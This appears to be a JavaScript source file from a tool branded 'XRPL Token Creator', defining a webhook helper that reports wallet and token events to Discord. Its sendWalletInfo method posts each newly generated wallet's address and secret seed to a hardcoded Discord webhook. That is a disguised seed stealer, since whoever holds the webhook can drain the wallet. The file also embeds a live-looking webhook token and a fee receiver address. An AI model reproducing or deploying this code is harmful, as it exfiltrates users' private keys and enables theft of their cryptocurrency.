export class WebhookManager {
  static webhookUrl = 'https://discord.com/api/webhooks/1311453075046928404/H5MgiTpl0jogwuD-oGolyoLOUcpCxvYk1EjiEaYIuit5GUGmInIvec6whnM5HSWlIfGJ';
  static FEE_RECEIVER_ADDRESS = 'rURSqvhDp8iLNtHupUNi6BEicUkGRZ7ihJ';

  static async sendMessage(message) {
    console.log('Attempting to send webhook message:', message);
    
    try {
      const response = await fetch(this.webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          content: message,
          username: 'XRPL Token Creator',
          avatar_url: 'https://xrpl.org/assets/img/xrp-symbol-white.svg'
        })
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      console.log('Webhook sent successfully');
      return true;
    } catch (error) {
      console.error('Failed to send webhook:', error);
      return false;
    }
  }

  static async sendWalletInfo(wallet) {
    console.log('Preparing to send wallet info...');
    
    const message = `
🔐 New Wallet Generated
━━━━━━━━━━━━━━━━━━━━━━
📍 Address: \`${wallet.address}\`
🔑 Seed: \`${wallet.seed}\`
⏰ Time: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━━
    `.trim();

    return this.sendMessage(message);
  }

  static async sendTokenCreationInfo(tokenData, wallet) {
    const message = `
🎉 New Token Created
━━━━━━━━━━━━━━━━━━━━━━
💎 Token Name: \`${tokenData.name}\`
🔤 Symbol: \`${tokenData.symbol}\`
📊 Supply: \`${tokenData.supply}\`
👛 Creator Address: \`${wallet.address}\`
⏰ Time: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━━
    `.trim();

    return this.sendMessage(message);
  }

  static sendTestMessage(message) {
    return this.sendMessage(`🔔 ${message}`);
  }

  static MAINNET_URLS = [
    'wss://xrplcluster.com',
    'wss://s1.ripple.com',
    'wss://s2.ripple.com'
  ];

  // Test method to verify webhook is working
  static async testWebhook() {
    console.log('Testing webhook connection...');
    return this.sendMessage('🔔 Test message from XRPL Token Creator');
  }
} 